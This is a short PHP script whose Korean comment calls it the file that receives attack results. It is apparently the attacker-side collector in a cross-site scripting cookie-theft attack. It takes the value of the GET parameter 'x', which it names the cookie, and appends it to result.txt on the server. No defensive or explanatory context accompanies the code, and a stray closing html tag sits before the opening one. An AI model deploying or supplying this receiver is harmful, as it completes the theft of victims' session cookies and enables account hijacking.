<!-- 공격 결과 전달받는 php파일-->

</html>
<html>

<head>
</head>

<body>
    <?
    $cookie = $_GET['x'];
    $filename = 'result.txt';

    $filepath = dirname(__FILE__);
    $filename = $filepath . "/" . $filename;

    if (file_exists($filename)) {
        $file = fopen($filename, 'ab+');
        fwrite($file, $cookie . "\n");
        fclose($file);
    }
    ?>
</body>

</html>